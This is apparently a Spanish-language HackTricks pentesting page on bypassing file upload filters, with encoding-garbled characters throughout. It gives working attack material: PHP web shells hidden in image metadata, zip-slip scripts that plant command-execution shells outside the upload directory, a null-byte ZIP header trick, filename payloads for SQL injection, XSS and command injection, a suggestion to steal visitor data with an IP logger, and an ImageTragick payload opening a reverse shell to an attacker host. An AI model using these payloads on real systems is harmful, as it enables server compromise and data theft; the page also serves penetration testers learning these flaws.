<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Metodolog√≠a general de carga de archivos

1. Intenta cargar un archivo con una **doble extensi√≥n** \(ejemplo: _file.png.php_ o _file.png.php5_\).
* Extensiones de PHP: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
* Extensiones de ASP: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. Intenta **poner en may√∫scula alguna\(s\) letra\(s\) de la extensi√≥n**. Por ejemplo: _.pHp, .pHP5, .PhAr ..._
3. Intenta cargar alguna **doble \(o m√°s\) extensi√≥n** \(√∫til para evadir comprobaciones mal configuradas que prueban si una extensi√≥n espec√≠fica est√° presente\):
1. _file.png.php_
2. _file.png.txt.php_
4. Intenta cargar alguna **doble extensi√≥n invertida** \(√∫til para explotar configuraciones incorrectas de Apache donde cualquier cosa con la extensi√≥n _.php_, pero **no necesariamente terminando en .php**, ejecutar√° c√≥digo\):
* _ejemplo: file.php.png_
5. Doble extensi√≥n con **car√°cter nulo**:
1. _ejemplo: file.php%00.png_
6. **Agrega algunos caracteres especiales al final** de la extensi√≥n_: %00, %20, \(varios puntos\)...._
1. _file.php%00_
2. _file.php%20_
3. _file.php...... --&gt; En Windows, cuando se crea un archivo con puntos al final, estos se eliminar√°n \(por lo que se pueden evadir los filtros que verifican la extensi√≥n .php\)
4. _file.php/_
5. _file.php.\_
7. Evita las comprobaciones de tipo de contenido estableciendo el **valor** del **encabezado Content-Type** en: _image/png_, _text/plain_, application/octet-stream_
8. Evita la comprobaci√≥n del n√∫mero m√°gico agregando al principio del archivo los **bytes de una imagen real** \(confunde el comando _file_\). O introduce la shell dentro de los **metadatos**: `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
1. Tambi√©n es posible que los **bytes m√°gicos** solo se est√©n **comprobando** en el archivo y se puedan establecer **en cualquier lugar del archivo**.
9. Usa el **flujo de datos alternativo NTFS \(ADS\)** en **Windows**. En este caso, se insertar√° un car√°cter de dos puntos ":" despu√©s de una extensi√≥n prohibida y antes de una permitida. Como resultado, se crear√° un **archivo vac√≠o con la extensi√≥n prohibida** en el servidor \(por ejemplo, "file.asax:.jpg"\). Este archivo puede editarse m√°s tarde utilizando otras t√©cnicas, como usar su nombre corto. El patr√≥n "**::$data**" tambi√©n se puede usar para crear archivos no vac√≠os. Por lo tanto, agregar un car√°cter de punto despu√©s de este patr√≥n tambi√©n puede ser √∫til para evadir restricciones adicionales \(por ejemplo, "file.asp::$data."\)
10. **Carga** la puerta trasera con una **extensi√≥n permitida** \(_png_\) y reza por una **configuraci√≥n incorrecta** que ejecute la puerta trasera
11. Encuentra una vulnerabilidad para **renombrar** el archivo ya cargado \(cambiar la extensi√≥n\).
12. Encuentra una vulnerabilidad de **Inclusi√≥n de archivo local** para ejecutar la puerta trasera.
13. **Posible divulgaci√≥n de informaci√≥n**:
1. Carga **varias veces** \(y al **mismo tiempo**\) el **mismo archivo** con el **mismo nombre**
2. Carga un archivo con el **nombre** de un **archivo** o **carpeta** que **ya existe**
3. Cargar un archivo con **‚Äú.‚Äù, ‚Äú..‚Äù, o ‚Äú‚Ä¶‚Äù como su nombre**. Por ejemplo, en Apache en **Windows**, si la aplicaci√≥n guarda los archivos cargados en el directorio "/www/uploads/", el nombre de archivo "." crear√° un archivo llamado "uploads" en el directorio "/www/".
4. Carga un archivo que no se pueda eliminar f√°cilmente, como **‚Äú‚Ä¶:.jpg‚Äù** en **NTFS**. \(Windows\)
5. Carga un archivo en **Windows** con caracteres no v√°lidos como `|<>*?‚Äù` en su nombre. \(Windows\)
6. Carga un archivo en **Windows** utilizando **nombres reservados** \(**prohibidos**\) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 y LPT9.

Tambi√©n intenta cargar un ejecutable \(.exe\) o un **.html** \(menos sospechoso\) que **ejecutar√° c√≥digo** cuando sea abierto accidentalmente por la v√≠ctima.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files" %}

Si est√°s intentando cargar archivos en un servidor **PHP**, [echa un vistazo al truco de **.htaccess** para ejecutar c√≥digo](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).
Si est√°s intentando cargar archivos en un servidor **ASP**, [echa un vistazo al truco de **.config** para ejecutar c√≥digo](../pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).
Los archivos `.phar` son como los archivos `.jar` para Java, pero para PHP, y se pueden **usar como un archivo PHP** (ejecut√°ndolo con PHP o incluy√©ndolo dentro de un script...).

La extensi√≥n `.inc` se utiliza a veces para archivos PHP que solo se utilizan para **importar archivos**, por lo que en alg√∫n momento alguien podr√≠a haber permitido **ejecutar esta extensi√≥n**.

**Verifique muchas posibles vulnerabilidades de carga de archivos con el complemento BurpSuit** [**https://github.com/modzero/mod0BurpUploadScanner**](https://github.com/modzero/mod0BurpUploadScanner) **o use una aplicaci√≥n de consola que encuentre qu√© archivos se pueden cargar y pruebe diferentes trucos para ejecutar c√≥digo:** [**https://github.com/almandin/fuxploider**](https://github.com/almandin/fuxploider)

## **Truco de carga de archivos/SSRF con wget**

En algunas ocasiones, puede suceder que un servidor est√© utilizando **`wget`** para **descargar archivos** y se pueda **indicar** la **URL**. En estos casos, es posible que el c√≥digo est√© verificando que la extensi√≥n de los archivos descargados est√© en una lista blanca para asegurarse de que solo se descarguen archivos permitidos. Sin embargo, **esta verificaci√≥n se puede eludir**.
La **longitud m√°xima** de un **nombre de archivo** en **Linux** es de **255**, sin embargo, **wget** trunca los nombres de archivo a **236** caracteres. Puede **descargar un archivo llamado "A"\*232+".php"+".gif"**, este nombre de archivo **burlar√°** la **verificaci√≥n** (como en este ejemplo **".gif"** es una extensi√≥n **v√°lida**) pero `wget` **renombrar√°** el archivo a **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Ten en cuenta que **otra opci√≥n** que puedes estar considerando para evadir esta verificaci√≥n es hacer que el **servidor HTTP redirija a un archivo diferente**, de modo que la URL inicial evite la verificaci√≥n y luego wget descargar√° el archivo redirigido con el nuevo nombre. Esto **no funcionar√°** **a menos que** wget se est√© utilizando con el **par√°metro** `--trust-server-names`, ya que **wget descargar√° la p√°gina redirigida con el nombre del archivo indicado en la URL original**.

# De la carga de archivos a otras vulnerabilidades

* Establece el **nombre de archivo** como `../../../tmp/lol.png` e intenta lograr una **traves√≠a de directorios**
* Establece el **nombre de archivo** como `sleep(10)-- -.jpg` y podr√≠as lograr una **inyecci√≥n SQL**
* Establece el **nombre de archivo** como `<svg onload=alert(document.comain)>` para lograr un XSS
* Establece el **nombre de archivo** como `; sleep 10;` para probar una inyecci√≥n de comandos \(m√°s [trucos de inyecci√≥n de comandos aqu√≠](command-injection.md)\)
* [**XSS** en carga de archivos de imagen \(svg\)](xss-cross-site-scripting/#xss-uploading-files-svg)
* Carga de archivo **JS** + **XSS** = [Explotaci√≥n de **Service Workers**](xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE en carga de archivos svg**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirecci√≥n abierta** mediante carga de archivos svg](open-redirect.md#open-redirect-uploading-svg-files)
* [Famosa vulnerabilidad de **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Si puedes **indicar al servidor web que capture una imagen desde una URL**, podr√≠as intentar abusar de una [SSRF](ssrf-server-side-request-forgery.md). Si esta **imagen** va a ser **guardada** en alg√∫n sitio **p√∫blico**, tambi√©n podr√≠as indicar una URL de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) y **robar informaci√≥n de cada visitante**.

Aqu√≠ tienes una lista de los 10 principales logros que puedes obtener mediante la carga de archivos \(desde [enlace](https://twitter.com/SalahHasoneh1/status/1281274120395685889)\):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS almacenado / SSRF / XXE
3. **GIF**: XSS almacenado / SSRF
4. **CSV**: Inyecci√≥n CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS**: Inyecci√≥n HTML / XSS / Redirecci√≥n abierta
8. **PNG / JPEG**: Ataque de inundaci√≥n de p√≠xeles \(DoS\)
9. **ZIP**: RCE mediante LFI / DoS
10. **PDF / PPTX**: SSRF / XXE ciego

# Carga autom√°tica de archivos ZIP descomprimidos

Si puedes cargar un archivo ZIP que se va a descomprimir dentro del servidor, puedes hacer 2 cosas:

## Symlink

Carga un enlace que contenga enlaces simb√≥licos a otros archivos, luego, al acceder a los archivos descomprimidos, acceder√°s a los archivos vinculados:
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## Descomprimir en diferentes carpetas

Los archivos descomprimidos se crear√°n en carpetas inesperadas.

Uno podr√≠a asumir f√°cilmente que esta configuraci√≥n protege contra la ejecuci√≥n de comandos a nivel de sistema operativo a trav√©s de cargas de archivos maliciosos, pero desafortunadamente esto no es cierto. Dado que el formato de archivo ZIP admite compresi√≥n jer√°rquica y tambi√©n podemos hacer referencia a directorios de niveles superiores, podemos escapar del directorio de carga seguro abusando de la funci√≥n de descompresi√≥n de la aplicaci√≥n objetivo.

Se puede encontrar un exploit automatizado para crear este tipo de archivos aqu√≠: [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
```python
import zipfile

def create_malicious_zip(file_path, payload):
    with zipfile.ZipFile(file_path, 'w') as zip_file:
        zip_file.writestr("../payload.php", payload)

file_path = "malicious.zip"
payload = "<?php system($_GET['cmd']); ?>"
create_malicious_zip(file_path, payload)
```

This Python code creates a malicious zip file that contains a payload.php file. The payload.php file contains PHP code that allows an attacker to execute arbitrary commands on the server using the `system` function. The `create_malicious_zip` function takes two parameters: `file_path`, which specifies the path where the malicious zip file will be created, and `payload`, which is the PHP code that will be written to the payload.php file.
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
Para lograr la ejecuci√≥n remota de comandos, segu√≠ los siguientes pasos:

1. Crear una shell PHP:
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. Utiliza la t√©cnica de "rociado de archivos" y crea un archivo zip comprimido:
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. Utiliza un editor hexadecimal o vi y cambia "xxA" por "../", yo utilic√© vi:
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
¬°Solo queda un paso! ¬°Sube el archivo ZIP y deja que la aplicaci√≥n lo descomprima! Si tiene √©xito y el servidor web tiene suficientes privilegios para escribir en los directorios, habr√° una simple ejecuci√≥n de comandos del sistema operativo en el sistema:

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**Referencia**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## Descomprimir con un nombre diferente

A veces, una aplicaci√≥n bloquear√° la carga de un archivo verificando su extensi√≥n dentro del archivo ZIP. Si esta verificaci√≥n es superficial, es decir, verificando el nombre del archivo dentro del campo de encabezado local, se puede eludir haciendo que la aplicaci√≥n crea que el archivo tiene esa extensi√≥n, aunque tendr√° otra una vez descomprimido.

Podemos reutilizar el script anterior para crear un archivo ZIP.
```python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('shell.php .pdf', '<?php echo system($_REQUEST["cmd"]); ?>')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
Ten en cuenta que el nombre tiene un espacio en su interior. Ahora puedes editar el archivo zip generado con un editor hexadecimal y cambiar este car√°cter en el campo del nombre ubicado dentro del Encabezado del Directorio Central por un byte nulo `00`:
```bash
# before changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 202e 7064  ...shell.php .pd
# after changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 002e 7064  ...shell.php..pd
```
Cuando la aplicaci√≥n verifique el nombre del archivo dentro del zip, el nombre utilizado para esta verificaci√≥n ser√° el nombre del encabezado de archivo local, **pero no si el zip est√° encriptado** (ver la especificaci√≥n pkzip). El nombre utilizado para almacenar el archivo ser√° el nombre del encabezado del directorio central cuando 7z o unzip vean una diferencia entre los dos nombres. Gracias al byte nulo, el nombre ser√° `shell.php`.

Cuando se descomprime:
```bash
7z e poc.zip
ls
shell.php
```
**Referencias**:

[https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html)

[https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)

# ImageTragic

Carga este contenido con una extensi√≥n de imagen para explotar la vulnerabilidad **\(ImageMagick, 7.0.1-1\)**.
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# Incrustando una Shell de PHP en PGN

La raz√≥n principal para poner una shell web en el chunk IDAT es que tiene la capacidad de evadir operaciones de cambio de tama√±o y re-muestreo: PHP-GD contiene dos funciones para hacer esto [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) y [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

Lee este art√≠culo: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# Archivos Pol√≠glotos

Los pol√≠glotos, en un contexto de seguridad, son archivos que son una forma v√°lida de m√∫ltiples tipos de archivos diferentes. Por ejemplo, un [GIFAR](https://en.wikipedia.org/wiki/Gifar) es tanto un archivo GIF como un archivo RAR. Tambi√©n existen archivos que pueden ser tanto GIF como JS, tanto PPT como JS, etc.

Los archivos pol√≠glotos se utilizan a menudo para evadir protecciones basadas en tipos de archivos. Muchas aplicaciones que permiten a los usuarios cargar archivos solo permiten cargar ciertos tipos, como JPEG, GIF, DOC, para evitar que los usuarios carguen archivos potencialmente peligrosos como archivos JS, archivos PHP o archivos Phar.

Esto ayuda a cargar un archivo que cumple con el formato de varios formatos diferentes. Puede permitirte cargar un archivo PHAR (PHp ARchive) que tambi√©n parece un JPEG, pero probablemente a√∫n necesitar√°s una extensi√≥n v√°lida y si la funci√≥n de carga no lo permite, esto no te ayudar√°.

M√°s informaci√≥n en: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al repositorio [hacktricks](https://github.com/carlospolop/hacktricks) y al repositorio [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
